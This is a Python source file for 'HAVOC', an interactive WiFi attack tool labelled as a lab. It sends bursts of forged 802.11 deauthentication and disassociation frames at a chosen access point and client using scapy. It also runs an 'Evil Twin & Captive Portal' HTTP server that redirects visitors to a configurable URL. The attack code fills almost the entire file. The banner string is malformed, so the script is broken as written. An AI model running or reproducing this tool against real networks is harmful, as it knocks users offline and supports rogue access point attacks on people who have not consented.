#!/usr/bin/env python3
from dataclasses import dataclass
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import os
import re
import shutil
import subprocess
import threading
import time

try:
    from scapy.all import Dot11, Dot11Deauth, Dot11Disas, RadioTap, sendp, sniff
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

ORANGE = "\033[38;5;208m"
PURPLE = "\033[38;5;135m"
RESET = "\033[0m"

BANNER = r"""██╗  ██╗ █████╗ ██╗   ██╗ ██████╗  ██████╗"""
             ██║  ██║██╔══██╗██║   ██║██╔═══██╗██╔════╝
             ███████║███████║██║   ██║██║   ██║██║     
             ██╔══██║██╔══██║╚██╗ ██╔╝██║   ██║██║     
             ██║  ██║██║  ██║ ╚████╔╝ ╚██████╔╝╚██████╗
             ╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝   ╚═════╝  ╚═════╝

MAC_REGEX = re.compile(r"^([0-9A-F]{2}:){5}[0-9A-F]{2}$")


@dataclass
class LabConfig:
    iface: str = "wlan0mon"
    channel: int = 6
    ssid: str = "LAB_TEST_NET"
    bssid: str = ""
    client: str = "FF:FF:FF:FF:FF:FF"
    probe_count: int = 5
    bursts: int = 15
    interval: float = 0.2
    redirect_url: str = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
    portal_port: int = 8080


def clear_screen() -> None:
    print("\033c", end="")


def is_valid_mac(mac: str) -> bool:
    return bool(MAC_REGEX.match(mac.strip().upper()))


def show_header(cfg: LabConfig) -> None:
    clear_screen()
    print(f"{ORANGE}{BANNER.strip()}{RESET}")
    print("=" * 60)
    print(f"Interface   : {cfg.iface:<14} | Channel : {cfg.channel}")
    print(f"SSID        : {cfg.ssid:<14} | BSSID   : {cfg.bssid or '(not set)'}")
    print(f"Client      : {cfg.client}")
    print(f"Redirect URL: {cfg.redirect_url}")
    print(f"Lab Portal  : http://0.0.0.0:{cfg.portal_port} | Scapy: {'YES' if SCAPY_AVAILABLE else 'NO'}")
    print("=" * 60)


def check_interface(iface: str) -> tuple[bool, str]:
    if not shutil.which("ip"):
        return False, "'ip' command not found"
    res = subprocess.run(["ip", "link", "show", iface], capture_output=True, text=True)
    if res.returncode != 0:
        return False, f"interface '{iface}' not found"
    first_line = res.stdout.strip().splitlines()[0]
    return True, first_line


def set_channel(iface: str, channel: int) -> bool:
    if shutil.which("iw"):
        res = subprocess.run(["iw", "dev", iface, "set", "channel", str(channel)], capture_output=True, text=True)
        if res.returncode == 0:
            return True
    if shutil.which("iwconfig"):
        res = subprocess.run(["iwconfig", iface, "channel", str(channel)], capture_output=True, text=True)
        if res.returncode == 0:
            return True
    return False


def build_mgmt_frame(mode: str, bssid: str, client: str):
    if not SCAPY_AVAILABLE:
        return None
    target = client.upper()
    ap = bssid.upper()
    payload = Dot11Disas(reason=8) if mode == "disassoc" else Dot11Deauth(reason=7)
    return RadioTap() / Dot11(addr1=target, addr2=ap, addr3=ap) / payload


def effect_precheck(cfg: LabConfig, mode: str = "deauth") -> bool:
    print(f"\n[01][PRE-CHECK] Running check ({mode}) on {cfg.iface}, channel {cfg.channel}...")

    if os.geteuid() != 0:
        print("[01][WARN] Not running as root (sudo): raw frame injection may fail.")

    ok_iface, details = check_interface(cfg.iface)
    print(f"[01][IFACE] {details}")
    if not ok_iface:
        print("[01][NO] Interface unavailable. Set it via option 06.")
        return False

    if set_channel(cfg.iface, cfg.channel):
        print(f"[01][CH] Channel set to {cfg.channel}.")
    else:
        print(f"[01][WARN] Unable to set channel {cfg.channel}.")

    if cfg.bssid and not is_valid_mac(cfg.bssid):
        print("[01][NO] Invalid BSSID format (use AA:BB:CC:DD:EE:FF).")
        return False

    if not is_valid_mac(cfg.client):
        print("[01][NO] Invalid client MAC format (use AA:BB:CC:DD:EE:FF).")
        return False

    if not cfg.bssid:
        print("[01][OK] Local check completed.")
        return True

    if not SCAPY_AVAILABLE:
        print("[01][WARN] Scapy not available: simulated pre-check completed.")
        return True

    frame = build_mgmt_frame(mode, cfg.bssid, cfg.client)
    try:
        sendp(frame, iface=cfg.iface, count=cfg.probe_count, inter=0.1, verbose=False)
        seen = sniff(
            iface=cfg.iface,
            timeout=1.5,
            lfilter=lambda pkt: pkt.haslayer(Dot11) and (pkt[Dot11].addr2 == cfg.bssid or pkt[Dot11].addr1 == cfg.bssid),
        )
        if len(seen) > 0:
            print(f"[01][OK] Channel response observed ({len(seen)} frames seen).")
            return True
        print("[01][NO] No channel response observed.")
        return False
    except PermissionError:
        print("[01][NO] Insufficient permissions to send raw frames.")
        return False
    except OSError as exc:
        print(f"[01][NO] Error on {cfg.iface}: {exc}")
        return False


def run_frame_sequence(cfg: LabConfig, mode: str, code: str) -> None:
    if not cfg.bssid:
        print("\n[!] Set the target BSSID first using option 06.")
        return

    if not effect_precheck(cfg, mode=mode):
        print(f"\n[{code}] '{mode}' sequence skipped.")
        return

    confirm = input(f"\n[{code}] Confirm {cfg.bursts} '{mode}' bursts toward {cfg.bssid}? [y/N]: ").strip().lower()
    if confirm not in ("y", "yes", "s", "si", "sì"):
        print(f"[{code}] Operation cancelled.")
        return

    frame = build_mgmt_frame(mode, cfg.bssid, cfg.client)
    print(f"\n[{code}][{mode.upper()}] Running ({cfg.bursts} bursts, interval {cfg.interval}s)...")

    for i in range(1, cfg.bursts + 1):
        if SCAPY_AVAILABLE and frame is not None:
            try:
                sendp(frame, iface=cfg.iface, count=1, verbose=False)
            except OSError as exc:
                print(f"  [!] Error on burst {i}: {exc}")
                break
        if i == 1 or i % 5 == 0 or i == cfg.bursts:
            print(f"  -> Burst {i}/{cfg.bursts}")
        time.sleep(cfg.interval)

    print(f"[{code}][DONE] {mode} sequence completed.")


def start_redirect_server(cfg: LabConfig, title: str, subtitle: str) -> None:
    target_url = cfg.redirect_url
    ssid_name = cfg.ssid

    class LabHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            print(f"  [HTTP] {self.client_address[0]} -> {target_url}")
            self.send_response(302)
            self.send_header("Location", target_url)
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            html = (
                f"<html><body><h3>{title}</h3>"
                f"<p>{subtitle} (SSID: {ssid_name})</p>"
                f"<p><a href='{target_url}'>Continue</a></p>"
                f"</body></html>"
            ).encode("utf-8")
            self.wfile.write(html)

        def log_message(self, format, *args):
            return

    try:
        server = ThreadingHTTPServer(("0.0.0.0", cfg.portal_port), LabHandler)
    except OSError as exc:
        print(f"[!] Failed to start server on port {cfg.portal_port}: {exc}")
        return

    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()

    print(f"\n[+] Server running on http://0.0.0.0:{cfg.portal_port}")
    print(f"[+] Redirect target: {target_url}")
    print("[*] Press ENTER to stop...")
    input()
    server.shutdown()
    server.server_close()
    print("[*] Server stopped.")


def configure_target(cfg: LabConfig) -> None:
    print("\n--- 06) Target & Interface ---")
    val = input(f"Interface [{cfg.iface}]: ").strip()
    if val:
        cfg.iface = val

    ch = input(f"Channel [{cfg.channel}]: ").strip()
    if ch.isdigit() and int(ch) > 0:
        cfg.channel = int(ch)

    ssid = input(f"SSID [{cfg.ssid}]: ").strip()
    if ssid:
        cfg.ssid = ssid

    bssid = input(f"BSSID [{cfg.bssid or 'none'}]: ").strip().upper()
    if bssid:
        if is_valid_mac(bssid):
            cfg.bssid = bssid
        else:
            print("[!] Invalid BSSID.")

    client = input(f"Client MAC [{cfg.client}]: ").strip().upper()
    if client:
        if is_valid_mac(client):
            cfg.client = client
        else:
            print("[!] Invalid client MAC.")


def configure_parameters(cfg: LabConfig) -> None:
    print("\n--- 07) Parameters ---")
    p = input(f"Pre-check packets [{cfg.probe_count}]: ").strip()
    if p.isdigit() and int(p) > 0:
        cfg.probe_count = int(p)

    b = input(f"Burst count [{cfg.bursts}]: ").strip()
    if b.isdigit() and int(b) > 0:
        cfg.bursts = int(b)

    d = input(f"Interval in sec [{cfg.interval}]: ").strip()
    if d:
        try:
            val = float(d)
            if val >= 0:
                cfg.interval = val
        except ValueError:
            print("[!] Invalid interval.")

    url = input(f"Redirect URL [{cfg.redirect_url}]: ").strip()
    if url:
        cfg.redirect_url = url

    port = input(f"Server port [{cfg.portal_port}]: ").strip()
    if port.isdigit() and 1 <= int(port) <= 65535:
        cfg.portal_port = int(port)


def main() -> None:
    cfg = LabConfig()
    menu_items = [
        "01) Packet effect test (pre-check)",
        "02) Deauth (pre-check -> sequence)",
        "03) Disassoc (pre-check -> sequence)",
        "04) Evil Twin & Captive Portal",
        "05) Media / Rickroll Redirect",
        "06) Set Interface, Channel, SSID, BSSID and Client",
        "07) Set parameters (probes, bursts, interval, URL, port)",
        "00) Exit",
    ]
    while True:
        show_header(cfg)
        for item in menu_items:
            print(f"{PURPLE}{item}{RESET}")

        choice = input("\nChoice: ").strip()

        if choice == "01":
            effect_precheck(cfg, mode="deauth")
            input("\nPress Enter...")
        elif choice == "02":
            run_frame_sequence(cfg, mode="deauth", code="02")
            input("\nPress Enter...")
        elif choice == "03":
            run_frame_sequence(cfg, mode="disassoc", code="03")
            input("\nPress Enter...")
        elif choice == "04":
            start_redirect_server(
                cfg,
                title="HAVOC - Captive Portal",
                subtitle="Lab portal test",
            )
        elif choice == "05":
            start_redirect_server(
                cfg,
                title="HAVOC - Media Redirect",
                subtitle="Configured redirect test",
            )
        elif choice == "06":
            configure_target(cfg)
        elif choice == "07":
            configure_parameters(cfg)
        elif choice == "00":
            break
        else:
            print("\n[!] Invalid choice.")
            time.sleep(0.8)


if __name__ == "__main__":
    main()
